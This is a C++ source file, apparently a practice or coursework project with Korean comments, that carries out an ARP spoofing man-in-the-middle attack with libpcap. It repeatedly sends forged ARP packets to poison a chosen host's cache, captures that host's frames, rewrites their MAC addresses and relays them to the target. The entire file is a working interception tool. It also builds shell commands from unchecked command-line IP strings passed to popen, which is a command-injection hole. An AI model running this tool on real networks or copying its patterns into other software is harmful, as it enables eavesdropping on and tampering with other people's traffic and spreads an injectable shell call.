#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <iostream>
#include <sstream>
#include <algorithm>
#include <thread>
#include <chrono>
#include <libnet.h>
#include <queue>
using namespace std;

queue<pair<const u_char*, size_t>> packets;
using MAC = uint8_t[6];

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

string cmd(string command) {
    std::string result;
    char buffer[128];
    FILE* pipe = popen(command.c_str(), "r");
    if (!pipe) {
        return "Error: popen failed!";
    }
    while (!feof(pipe)) {
        if (fgets(buffer, 128, pipe) != nullptr) {
            result += buffer;
        }
    }
    pclose(pipe);
    if (!result.empty() && result.back() == '\n') {
        result.pop_back();
    }
    return result;
}

void macFstr(string strMac, MAC &mac){
    std::istringstream iss(strMac);
    iss >> std::hex;
     for (int i = 0; i < 6; ++i) {
        unsigned int val;
        char tmp;
        iss >> val;
        if (i < 5) {
            iss >> tmp;
        }
        mac[i] = static_cast<uint8_t>(val);
    }
}

void getMymac(string inter, MAC &mac) {
    string command = "ifconfig " + inter;
    string output = cmd(command);
    istringstream iss(output);
    string line;
    while (getline(iss, line)) {
        auto pos = line.find("ether ");
        if (pos != string::npos) {          
            string macT = line.substr(pos + 6, 17);
            macFstr(macT, mac);
        }
    }
}

string getSmac(string sip, MAC &mac) {
    string command = "arp -n " + sip + " | awk '/" + sip + "/ {print $3}' ";
    string output = cmd(command); 
    macFstr(output, mac);
    return output;
}

void getTmac(string tip, MAC &mac) {
    string command = "arp -n " + tip + " | awk '/" + tip + "/ {print $3}' ";
    string output = cmd(command);
    macFstr(output, mac);
}

void arpSpoof(string inter, string senderIp, string targetIp) { 
    EthArpPacket packet;

    MAC smac;
    getSmac(senderIp, smac); //sender mac
    MAC mymac;
    getMymac(inter, mymac); //Attacker mac

    packet.eth_.dmac_ = smac;
    packet.eth_.smac_ = mymac;
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = mymac;
    packet.arp_.sip_ = htonl(Ip(targetIp)); 
    packet.arp_.tmac_ = smac;
    packet.arp_.tip_ = htonl(Ip(senderIp));

    const char* dev = inter.c_str();
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);

    while (1) {
        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
        this_thread::sleep_for(std::chrono::seconds(5));//5초 간격으로 스푸핑.    
    }

    pcap_close(handle);
}

void packetHandler(u_char* userData, const struct pcap_pkthdr* pkthdr, const u_char* packet) {
    size_t siz=pkthdr->caplen;
    packets.push(make_pair(packet, siz));
    cout<<"put one packet to queue"<<endl;
}

void Listen(string inter, string sip) { //스레드2, pcap_loop.
    const char* dev = inter.c_str();
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);

    MAC mac;
    string smac=getSmac(sip, mac);//s ip
   
    if (handle == nullptr) {
        cerr << "Couldn't open interface eth0: " << errbuf << endl;
    }
    string str = "ether src host "; //필터 표현식: 샌더 맥만 필터링.
    str+=smac;
    const char* filter = str.c_str();

    struct bpf_program fp;
    if (pcap_compile(handle, &fp, filter, 0, PCAP_NETMASK_UNKNOWN) == -1) { //필터 컴파일
        cerr << "Could not parse filter " << filter << ": " << pcap_geterr(handle) << endl;
    }
    if (pcap_setfilter(handle, &fp) == -1) { //필터 세팅
        cerr << "Could not install filter " << filter << ": " << pcap_geterr(handle) << endl;
    }
    pcap_loop(handle, 0, packetHandler, nullptr); //패킷 리슨.
}

void relay(char* inter, string senderIP, string targetIP) { //MAC targetmac, MAC mymac
    const char* dev = inter;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);

    MAC targetmac, mymac;
    getTmac(targetIP, targetmac);
    getMymac(inter, mymac);

    while (1) {
        if (packets.empty()) { 
            this_thread::sleep_for(std::chrono::milliseconds(100));//패킷 큐가 비었을 경우 슬립 0.1초
            continue;
        }
        else {
            u_char* packet = (u_char*)packets.front().first; //큐 첫번쨰 요소. 패킷.
            size_t len=packets.front().second; //패킷 크기.
            packets.pop();
 
            struct libnet_ethernet_hdr* eth_hdr = (struct libnet_ethernet_hdr*)packet;
            struct libnet_ipv4_hdr* ip_hdr = (struct libnet_ipv4_hdr*)(packet + 14);
            
            if (ip_hdr->ip_src.s_addr == htonl(Ip(senderIP))) { //IP확인. 지정한 샌더의 IP만.      
                memcpy(eth_hdr->ether_shost, mymac, sizeof(MAC));  //소스 맥: 어태커(나)        
                memcpy(eth_hdr->ether_dhost, targetmac, sizeof(MAC)); //데스티네이션 맥 : 타겟

                int res = pcap_sendpacket(handle, packet, len);//패킷 크기에 유의.
                if (res != 0)
                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                else
                {
                    for (size_t i = 0; i < sizeof(EthArpPacket); ++i)
                        printf("%hhX ", packet[i]);
                    cout<<"\nsend relay"<<endl;
                }
            }
        }
    }

    pcap_close(handle);
}

void workerThread(char* interface, const string& senderIP, const string& targetIP) {
    arpSpoof(interface, senderIP, targetIP);
    Listen(interface, senderIP);
    relay(interface, senderIP, targetIP);
}

int main(int argc, char* argv[]) { //interface, sender ip, target ip
    if (argc < 4) {    
        cout<<"put <interface> <sender ip> <target ip>"<<endl;
	    return 0;
    }

    thread autoArp(arpSpoof, argv[1], argv[2], argv[3]); //use 1,2,3 / smac, mymac
    thread listener(Listen, argv[1], argv[2]); //use 1 / smac
    thread relayGo(relay, argv[1], argv[2], argv[3]); //use 1,2 / targetmac, mymac

    autoArp.detach(); //메인 스레드와 관계없이 돌아감.
    listener.detach();
    relayGo.detach();

    while (true) { //대기.
        this_thread::sleep_for(std::chrono::seconds(1));
    }
}